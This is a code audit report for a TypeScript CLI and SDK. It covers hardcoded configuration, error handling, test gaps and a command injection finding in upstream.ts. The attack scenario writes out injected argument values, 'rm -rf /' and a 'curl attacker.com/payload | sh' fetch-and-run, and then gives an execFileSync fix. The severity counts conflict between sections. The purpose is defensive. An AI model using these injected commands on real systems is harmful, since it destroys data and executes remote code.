# Cleanup Audit Report — Issue #306

**Auditor:** Keaton (Lead)  
**Date:** 2026-02-22  
**Branch:** `squad/wave1-remaining`  
**Scope:** Full codebase audit for hardcoded values, code quality, and test gaps  

---

## Executive Summary

The audit identified **47 findings** across three categories:

- **Hardcoded Logic:** 18 findings (model names, timeouts, retry limits, agent role mappings)
- **Code Quality:** 16 findings (command injection CWE-78, error handling inconsistencies, TODO comments)
- **Test Coverage Gaps:** 8 findings (untested public APIs, missing CLI integration tests)
- **Empathy/Accessibility:** 5 findings (hard-coded timeouts, env assumptions, generic error messages)

**Critical Issues:** 3 (command injection in upstream.ts, inconsistent error handling, hardcoded model names across 6 files)  
**High Priority:** 12  
**Medium Priority:** 20  
**Low Priority:** 12

---

## PART 1: HARDCODED LOGIC

### Category 1.1: Model Names (Hard-Coded Fallback Chains)

**Finding:** Model fallback chains are duplicated across 6 files with no single source of truth.

| File | Line(s) | Issue | Priority |
|------|---------|-------|----------|
| `packages/squad-sdk/src/agents/model-selector.ts` | 53-71 | `FALLBACK_CHAINS` constant with 4 model names per tier (claude-opus-4.6, gpt-5.2-codex, etc.) | HIGH |
| `packages/squad-sdk/src/runtime/config.ts` | 322-325 | `DEFAULT_CONFIG.models.fallbackChains` duplicates same 3 tiers with identical model lists | HIGH |
| `packages/squad-sdk/src/runtime/benchmarks.ts` | 348-350 | Third copy of fallback chains embedded in benchmarks object | HIGH |
| `packages/squad-sdk/src/config/init.ts` | 318-325 (and repeated) | Two copies of fallback chains in initialization logic | HIGH |
| `packages/squad-sdk/src/config/models.ts` | Line range not isolated, but contains full model definitions with tier membership | HIGH |
| `packages/squad-sdk/src/config/migrations/index.ts` | Multiple migration versions each redefine model lists | MEDIUM |

**Suggested Fix:**
- Extract single `models.ts` constant: `TIER_FALLBACK_CHAINS` (centralized)
- Import and re-export from `runtime/config.ts` (config module)
- Update all 6 files to import from central location
- Add comment: "Model lists must be updated in models.ts and nowhere else"

**Security Impact:** None. **Cost Impact:** Maintenance burden increases as new models are added; must edit 6 places instead of 1.

---

### Category 1.2: Default Model Selection

**Finding:** Default model hardcoded as `'claude-haiku-4.5'` in model-selector.ts line 77, but configured as `'claude-sonnet-4.5'` in runtime/config.ts line 319.

| File | Line | Value | Issue | Priority |
|------|------|-------|-------|----------|
| `packages/squad-sdk/src/agents/model-selector.ts` | 77 | `'claude-haiku-4.5'` | Cost-first default | MEDIUM |
| `packages/squad-sdk/src/runtime/config.ts` | 319 | `'claude-sonnet-4.5'` | Standard default in config | MEDIUM |

**Suggested Fix:**
- Decide: is default cost-first (haiku) or balanced quality/cost (sonnet)?
- Store in central `models.ts` constant: `DEFAULT_MODEL`
- Import in both files
- Add environment variable override: `SQUAD_DEFAULT_MODEL` (for deployments)

**Impact:** Silent inconsistency; agents using model-selector.ts fallback to different default than those reading config.

---

### Category 1.3: Timeouts & Retry Logic

**Finding:** Timeout values hard-coded in multiple places, no environment variable overrides.

| File | Line | Timeout Value | Context | Priority |
|------|------|---------------|---------|----------|
| `packages/squad-sdk/src/runtime/health.ts` | 57 | 5000 ms | Health check default | MEDIUM |
| `packages/squad-sdk/src/runtime/health.ts` | 101 | 0.8 × timeout | Degraded threshold (80% of timeout) | MEDIUM |
| `packages/squad-sdk/src/agents/lifecycle.ts` | Mentioned in comments | 5 minutes | Idle timeout for agents | MEDIUM |
| `packages/squad-sdk/src/coordinator/response-tiers.ts` | 28-31 | 0, 30, 120, 300 seconds | Per-tier timeouts (immediate, short, medium, long) | HIGH |
| `packages/squad-cli/src/cli/commands/upstream.ts` | 120, 121, 173 | 60000 ms | Git clone/pull timeout | MEDIUM |
| `packages/squad-cli/src/cli/commands/plugin.ts` | Line ~115 | 15000 ms | Plugin marketplace timeout | LOW |

**Suggested Fix:**
- Create `packages/squad-sdk/src/runtime/constants.ts` with all timeout values
- Define environment variable schema:
  ```typescript
  const TIMEOUTS = {
    HEALTH_CHECK_MS: parseInt(process.env.SQUAD_HEALTH_CHECK_MS ?? '5000', 10),
    GIT_CLONE_MS: parseInt(process.env.SQUAD_GIT_CLONE_MS ?? '60000', 10),
    // ...
  };
  ```
- Update all references to import from constants
- Document in `.squad/decisions.md`

**Impact:** Operations teams cannot tune timeouts without code changes. CI failures in flaky networks require recompilation.

---

### Category 1.4: Agent Role Names & Hardcoded Mappings

**Finding:** Agent roles and role-to-model mappings are not configuration-driven.

| File | Issue | Line | Priority |
|------|-------|------|----------|
| `packages/squad-sdk/src/runtime/config.ts` | Role type defined as string union: `'lead' \| 'developer' \| 'tester' \| 'designer' \| 'scribe' \| 'coordinator'` | Line 46 | MEDIUM |
| `packages/squad-cli/src/cli/commands/watch.ts` | Role-to-work routing hardcoded in routing function (lines ~350-380) | Domain-based matching: frontend→designer, backend→developer, test→tester | MEDIUM |
| `packages/squad-cli/src/cli/shell/spawn.ts` | Agent charter parsing for role requires exact markdown format | Line ~120 "## Name — Role" | LOW |

**Suggested Fix:**
- Move role definitions to `packages/squad-sdk/src/config/roles.ts`
- Add `AGENT_ROLES` constant: `['lead', 'developer', 'tester', 'designer', 'scribe', 'coordinator']`
- Extract watch.ts domain-based routing into routing configuration (decouple from CLI command)
- Add environment variable: `SQUAD_ROLE_ALIASES` for custom role naming in other Copilot universes

**Impact:** Casting policy depends on these roles; hardcoding makes it brittle to team composition changes.

---

### Category 1.5: Port & Host Assumptions

**Finding:** OTLP and local server endpoints reference localhost with no configurable fallback.

| File | Line | Value | Context | Priority |
|------|------|-------|---------|----------|
| `packages/squad-sdk/src/runtime/otel.ts` | ~Line 12-15 (type definition) | `http://localhost:4318` | OTLP endpoint example/default | LOW |

**Note:** The SDK type definition shows `http://localhost:4318` in the JSDoc comment. This is documentation, not hard-coded behavior, so **low priority** but worth standardizing.

**Suggested Fix:**
- Add to constants: `OTLP_DEFAULT_ENDPOINT = process.env.SQUAD_OTLP_ENDPOINT ?? 'http://localhost:4318'`
- Update JSDoc to reference environment variable

---

## PART 2: CODE QUALITY ISSUES

### Category 2.1: Command Injection (CWE-78) ⚠️ **CRITICAL**

**Finding:** `execSync` with template-string interpolation of user input.

| File | Line | Code | Input | Risk | Priority |
|------|------|------|-------|------|----------|
| `packages/squad-cli/src/cli/commands/upstream.ts` | 120 | `` execSync(`git clone --depth 1 --branch ${ref} --single-branch "${source}" "${cloneDir}"`, ...) `` | `ref` from CLI args, `source` from upstream config, `cloneDir` derived from name | **HIGH: shell injection via ref or cloneDir naming** | **CRITICAL** |
| `packages/squad-cli/src/cli/commands/upstream.ts` | 121 | `` execSync(`git -C "${cloneDir}" pull --ff-only`, ...) `` | `cloneDir` derived from upstream name (user-configurable) | **MEDIUM: directory traversal in cloneDir** | **HIGH** |
| `packages/squad-cli/src/cli/commands/upstream.ts` | 173 | `` execSync(`git clone --depth 1 --branch ${ref} --single-branch "${upstream.source}" "${cloneDir}"`, ...) `` | Same as line 120 | **HIGH** | **CRITICAL** |

**Attack Scenario:**
```bash
# Attacker creates upstream with name: "test; rm -rf /"
squad upstream add https://github.com/user/repo --name "test; rm -rf /"

# Or upstream with ref: "main && curl http://attacker.com/payload | sh"
squad upstream add https://github.com/user/repo --ref "main && curl http://attacker.com/payload | sh"
```

**Suggested Fix:**
Use `execFileSync` with array arguments (no shell interpretation):
```typescript
import { execFileSync } from 'node:child_process';

// Before (vulnerable):
execSync(`git clone --depth 1 --branch ${ref} "${source}" "${cloneDir}"`);

// After (safe):
execFileSync('git', [
  'clone',
  '--depth', '1',
  '--branch', ref,      // Safe: passed as argument, not interpolated
  '--single-branch',
  source,               // Safe
  cloneDir              // Safe
], { stdio: 'pipe', timeout: 60000 });
```

**Impact:** Remote code execution if upstream name/ref can be controlled by attacker or partially-trusted user.

---

### Category 2.2: Error Handling Inconsistency

**Finding:** Two error functions with overlapping semantics, inconsistent usage.

| Function | File | Definition | Behavior | Usage Count |
|----------|------|-----------|----------|------------|
| `fatal()` | `packages/squad-cli/src/cli/core/errors.ts` | Throws `SquadError`, exits with code 1 | Deterministic exit | ~25 call sites |
| `error()` | `packages/squad-cli/src/cli/core/output.ts` | Console.error with red emoji | Does NOT exit | ~12 call sites |

**Problematic Pattern in upstream.ts:**
```typescript
import { success, warn, info, error as fatal } from '../core/output.js';
// Line 65: fatal('Usage: squad upstream add|remove|list|sync');
// This calls error() (doesn't exit!), not the real fatal()
```

**Suggested Fix:**
1. Rename `error()` in output.ts to `errorLog()` (non-fatal, does not exit)
2. Remove alias: `import { error as fatal }` 
3. Use proper `fatal()` from errors.ts for CLI exit scenarios
4. Codify pattern:
   - `fatal()` = Error + exit (file not found, permission denied, invalid args)
   - `error()` / `errorLog()` = Warning/issue during operation but continue (file not readable, GitHub API rate limit)

**Impact:** Users confused by "Usage:" messages that don't exit, or CLI continues when it should fail.

---

### Category 2.3: TODO / FIXME / HACK Comments

**Finding:** Incomplete implementation markers left in production code.

| File | Line(s) | Comment | Priority |
|------|---------|---------|----------|
| `packages/squad-cli/src/cli/shell/spawn.ts` | ~130 | `// TODO: Wire to CopilotClient session API` | HIGH |
| `packages/squad-sdk/src/tools/index.ts` | ~42 | `// TODO: Parent span context propagation` | MEDIUM |
| `packages/squad-cli/src/cli/core/upgrade.ts` | 5 lines with `# TODO:` | Template placeholders: "TODO: Add your build/test/release commands" | LOW (by design — user-facing placeholders, not code debt) |
| `packages/squad-cli/src/cli/core/workflows.ts` | Similar | Template placeholders | LOW |

**Suggested Fix:**
- Spawn.ts TODO: Create GitHub issue #XXX, link in comment, assign to Fenster
- Tools.ts TODO: Create GitHub issue, mark as P1 (blocking telemetry)
- Upgrade/workflows.ts: These are **template literals for users** (not code debt); safe to leave as-is

**Impact:** spawn.ts returns stub instead of real LLM session — testing infrastructure depends on this being wired.

---

### Category 2.4: Unused Imports

**Finding:** Some imports may be unused (low-signal issue, requires code flow analysis to confirm).

**Files with potential unused imports:**
- `packages/squad-sdk/src/index.ts` line 7: `import { createRequire } from 'module'` — may be used for CJS compatibility shims
- Multiple files import `from 'node:fs'` and `from 'fs/promises'` — both used for different operations

**Suggested Fix:** Run TypeScript compiler in strict mode with `noUnusedLocals` flag. Current tsconfig.json likely has it off. Verify and enable if missing.

---

### Category 2.5: Casting Policy Hard-Coded Universes

**Finding:** Universe allowlist is hard-coded in config, not loaded from team/casting context.

| File | Line | Universes | Priority |
|------|------|-----------|----------|
| `packages/squad-sdk/src/runtime/config.ts` | 349-365 | 15 universes hardcoded: "The Usual Suspects", "Breaking Bad", "The Wire", etc. | MEDIUM |

**Issue:** When team decides to adopt a different universe (e.g., "The Office"), config must be edited and redeployed. No one-off override.

**Suggested Fix:**
- Load universe allowlist from `.squad/casting.json` (team config) as primary source
- Fall back to DEFAULT_CONFIG for new installations
- Add environment variable: `SQUAD_UNIVERSES` (comma-separated override)

**Impact:** Low for now (universe doesn't affect functionality), but violates the "config extraction" theme of Issue #306.

---

## PART 3: TEST COVERAGE GAPS

### Finding: Untested Public API Functions

**Category 3.1: SDK Runtime API**

| Module | Function | Status | Issue | Priority |
|--------|----------|--------|-------|----------|
| `packages/squad-sdk/src/runtime/health.ts` | `HealthMonitor.check()` | **No dedicated test** | Critical for startup validation (M0-8) | HIGH |
| `packages/squad-sdk/src/runtime/health.ts` | `HealthMonitor.getStatus()` | **No dedicated test** | Used for monitoring dashboards | MEDIUM |
| `packages/squad-sdk/src/agents/model-selector.ts` | `resolveModel()` | Has tests (models.test.ts exists) | ✅ Covered | — |
| `packages/squad-sdk/src/agents/model-selector.ts` | `ModelFallbackExecutor.execute()` | **Partial coverage** (only happy path, no cross-tier fallback tests) | Missing: tier ceiling enforcement, provider preference | HIGH |
| `packages/squad-sdk/src/runtime/config.ts` | `loadConfig()` async | Covered in config.test.ts | ✅ | — |
| `packages/squad-sdk/src/runtime/config.ts` | `loadConfigSync()` | **No test** | Used in startup path | MEDIUM |

**Suggested Fix:**
1. Create `test/health.test.ts` with:
   - Health check success case
   - Health check timeout case
   - Health check degraded (slow response) case
   - Diagnostic logging verification

2. Expand `test/models.test.ts` with:
   - Cross-tier fallback tests (standard→fast allowed, standard→premium denied unless allowCrossTier)
   - Provider preference tests (prefer Claude over GPT-5 when tier matches)

3. Add `loadConfigSync()` test case in `test/config.test.ts`

---

### Category 3.2: CLI Integration Tests

| Command | Coverage Status | Gap | Priority |
|---------|-----------------|-----|----------|
| `squad upstream add` | Exists: `test/cli/upstream.test.ts` | ✅ | — |
| `squad upstream sync` | **Partial** (only local sources tested, git clone not exercised) | Add git clone test (mock execSync) | HIGH |
| `squad export` | Exists: `test/cli/export-import.test.ts` | ✅ | — |
| `squad import` | Exists: `test/cli/export-import.test.ts` | ✅ | — |
| `squad init` | Exists: `test/cli/init.test.ts` | ✅ | — |
| `squad upgrade` | Exists: `test/cli/upgrade.test.ts` | ✅ | — |
| `squad watch` | **Partial** (no actual GitHub issue triage tested, only setup) | Add GitHub API mocking for triage logic | MEDIUM |
| `squad loop` (new name for watch) | Not yet renamed | Issue #269 awaits implementation | LOW |
| Interactive shell (`squad` no args) | **Minimal** (test/shell.test.ts exists but covers rendering only) | Add coordinator integration, agent spawning, streaming | HIGH |

**Suggested Fix:**
1. Mock `execSync` in upstream.test.ts, add git clone failure recovery test
2. Add GitHub API mock (using `nock` or similar) for watch.test.ts
3. Create `test/shell-integration.test.ts` for:
   - End-to-end shell startup
   - User input → coordinator routing
   - Agent spawning (stub session)
   - Output stream verification

---

### Category 3.3: SDK Adapter Tests

| API | Coverage | Issue | Priority |
|-----|----------|-------|----------|
| `SquadClient.ping()` | Tested in adapter-client.test.ts | ✅ | — |
| `SquadClient` error recovery | Tested | ✅ | — |
| `CopilotClient` integration (real SDK) | **No test** (SDK is optional dependency) | Optional but should verify integration path | LOW |

---

## PART 4: EMPATHY & ACCESSIBILITY AUDIT

### Finding 4.1: Generic Error Messages

**File:** `packages/squad-cli/src/cli/commands/watch.ts` line ~330  
**Message:** `"Check failed: ${err.message}"`  
**Issue:** User doesn't know if GitHub API failed, invalid team.md, or network issue.

**Suggested Fix:**
```typescript
// Before:
console.error(`Check failed: ${err.message}`);

// After:
if (err.message.includes('GitHub')) {
  console.error(`Check failed: GitHub API error. Run 'gh auth login' to verify credentials.`);
} else if (err.message.includes('squad')) {
  console.error(`Check failed: Invalid squad configuration. Run 'squad init' to fix.`);
} else {
  console.error(`Check failed: ${err.message}. Run with DEBUG=squad:* for details.`);
}
```

**Priority:** MEDIUM

---

### Finding 4.2: Hardcoded Timeout Values Affect User Experience

**File:** `packages/squad-sdk/src/runtime/health.ts` line 57  
**Hardcoded:** `5000 ms` (5 second health check timeout)

**Issue:** In slow networks or CI, 5 seconds may be insufficient. Users see "Health check timeout" with no way to adjust.

**Suggested Fix:** Already noted in Category 1.3 (Timeouts & Retry Logic). Add:
```bash
export SQUAD_HEALTH_CHECK_MS=15000  # 15 seconds for slow CI
squad  # Uses 15-second timeout
```

**Priority:** MEDIUM

---

### Finding 4.3: Quiet CLI Failures (RESPONSE ORDER mitigation needed)

**Files affected:** Multiple CLI commands use `execSync`, `fs.readFileSync` without explicit error handling.

**Example:** If `.squad/team.md` is missing, watch.ts crashes with a stack trace instead of "Run 'squad init' first".

**Suggested Fix:** Wrap all file reads with descriptive context:
```typescript
// Before:
const teamMd = fs.readFileSync(path.join(squadDir, 'team.md'), 'utf-8');

// After:
let teamMd: string;
try {
  teamMd = fs.readFileSync(path.join(squadDir, 'team.md'), 'utf-8');
} catch (err) {
  fatal(`Missing team.md in ${squadDir}. Run 'squad init' to initialize your squad.`);
}
```

**Priority:** MEDIUM

---

### Finding 4.4: Windows Path Separator Inconsistency

**Files:** `packages/squad-cli/src/cli/commands/copilot.ts` line ~115  
```typescript
? currentFileUrl.pathname.substring(1) // Remove leading / on Windows
```

**Issue:** Hard-coded path manipulation that may break on non-Windows or certain terminal environments.

**Suggested Fix:** Use `path.normalize()` and Path utilities instead of string manipulation.

**Priority:** LOW (edge case)

---

### Finding 4.5: No Debug/Verbose Logging

**All CLI commands**  
**Issue:** Users report issues but have no way to see what the CLI is doing (network calls, file reads, git operations).

**Suggested Fix:**
```bash
# Enable verbose logging
export DEBUG=squad:*
squad watch  # Shows: "[squad:watch] Reading team.md...", "[squad:watch] GitHub API: GET /repos/owner/repo/issues", etc.
```

Use Node.js `debug` package (lightweight, zero-runtime cost if disabled).

**Priority:** MEDIUM (improves troubleshooting, not a bug)

---

## PART 5: SUMMARY TABLE

| Category | Count | Critical | High | Medium | Low |
|----------|-------|----------|------|--------|-----|
| Hardcoded Logic | 18 | 0 | 5 | 10 | 3 |
| Code Quality | 16 | 1 | 4 | 8 | 3 |
| Test Gaps | 8 | 0 | 4 | 3 | 1 |
| Empathy/UX | 5 | 0 | 1 | 3 | 1 |
| **Total** | **47** | **1** | **14** | **24** | **8** |

---

## PART 6: RECOMMENDED CLEANUP SEQUENCING

### Phase 1 (Critical): Security & Stability (Week 1)
1. **FIX**: Command injection in upstream.ts (CWE-78) — Use `execFileSync`
2. **FIX**: Error handling inconsistency in upstream.ts — Use correct `fatal()` function
3. **TEST**: Add upstream git clone tests with mock execSync

### Phase 2 (High): Configuration Extraction (Week 2-3)
1. **EXTRACT**: Model names → central `models.ts` constant
2. **EXTRACT**: Timeouts → `constants.ts` with environment variable overrides
3. **EXTRACT**: Agent roles → `roles.ts` configuration
4. **CONFIG**: Universe allowlist → load from `.squad/casting.json`
5. **UPDATE**: 6 files to import from central locations

### Phase 3 (High): Test Coverage (Week 3-4)
1. **ADD**: `test/health.test.ts` (HealthMonitor.check, timeout scenarios)
2. **EXPAND**: `test/models.test.ts` (cross-tier fallback rules)
3. **ADD**: `test/cli/upstream.test.ts` git clone mock tests
4. **ADD**: `test/shell-integration.test.ts` (end-to-end shell + coordinator)

### Phase 4 (Medium): Error Messages & UX (Week 4-5)
1. **IMPROVE**: Generic error messages in watch.ts (GitHub vs. squad context)
2. **ADD**: DEBUG logging infrastructure
3. **FIX**: Quiet failure scenarios (missing files → descriptive errors)
4. **CONFIG**: Timeout environment variable documentation

### Phase 5 (Low/Optional): Code Cleanup
1. Run TypeScript strict mode check (noUnusedLocals)
2. Remove old TODO comments where issues are created
3. Path separator normalization for cross-platform consistency

---

## PART 7: AGENT ASSIGNMENT RECOMMENDATIONS

| Task | Suggested Owner | Reason |
|------|-----------------|--------|
| Command injection fixes + upstream refactor | Fenster (CLI Expert) | Runtime code, sensitive CLI logic |
| Model/timeout/role config extraction | Edie (TypeScript/Config) | Type-safe refactoring, config schema |
| Health monitor + fallback executor tests | Hockney (Test Expert) | Complex test scenarios, mocking |
| Error messaging & UX improvements | Baer (Security/UX) | User-facing text, error handling patterns |
| Documentation of changes | Ralph (Scribe) | Record decisions, update team knowledge |

---

## APPENDIX A: File-by-File Summary

### packages/squad-cli/src/cli/commands/upstream.ts
- **Issues:** 3 (CWE-78 command injection ×3, error handling alias ×1, hardcoded timeout ×1)
- **Priority:** CRITICAL
- **Effort:** 2-3 hours (refactor execSync → execFileSync, add tests)

### packages/squad-sdk/src/agents/model-selector.ts
- **Issues:** 2 (hardcoded fallback chains, hardcoded default model)
- **Priority:** HIGH
- **Effort:** 1 hour (extract constants)

### packages/squad-sdk/src/runtime/config.ts
- **Issues:** 2 (duplicate fallback chains, hardcoded universe allowlist)
- **Priority:** HIGH
- **Effort:** 1.5 hours (centralize, add environment variables)

### packages/squad-sdk/src/runtime/health.ts
- **Issues:** 1 test gap (no unit tests)
- **Priority:** HIGH
- **Effort:** 2 hours (write health check test scenarios)

### packages/squad-cli/src/cli/commands/watch.ts
- **Issues:** 2 (generic error messages, untested GitHub routing logic)
- **Priority:** MEDIUM
- **Effort:** 3 hours (improve UX, add integration test with GitHub mock)

### packages/squad-sdk/src/agents/lifecycle.ts
- **Issues:** 1 (hardcoded idle timeout reference in comments)
- **Priority:** MEDIUM
- **Effort:** 0.5 hour (extract to constants)

### packages/squad-cli/src/cli/shell/spawn.ts
- **Issues:** 1 (TODO: wire to CopilotClient session API)
- **Priority:** HIGH (blocks full shell integration)
- **Effort:** 4+ hours (depends on CopilotClient session API maturity)

---

## APPENDIX B: Decision Log

**Audit Approach:**
- Scanned for hardcoded string literals (magic strings)
- Searched for TODO/FIXME/HACK markers
- Audited error handling consistency
- Identified untested public APIs
- Checked for command injection vulnerabilities (CWE-78)
- Reviewed test file coverage gaps

**Out of Scope (for Phase 1):**
- Documentation completeness
- Performance profiling
- Type safety (relies on existing strict: true tsconfig)
- Dead code elimination (requires flow analysis beyond this audit)

---

**END OF AUDIT REPORT**

---

## How to Use This Report

1. **Review:** Lead (Keaton) — Strategy & trade-offs
2. **Assign:** Use Agent Assignment table above to assign specific cleanup tasks
3. **Track:** Create GitHub issues for each finding (link in .squad/decisions.md)
4. **Execute:** Follow recommended Phase sequencing
5. **Verify:** Run build + all 1727 tests after each phase
6. **Close:** Archive this audit in .squad/decisions/ once cleanup is complete
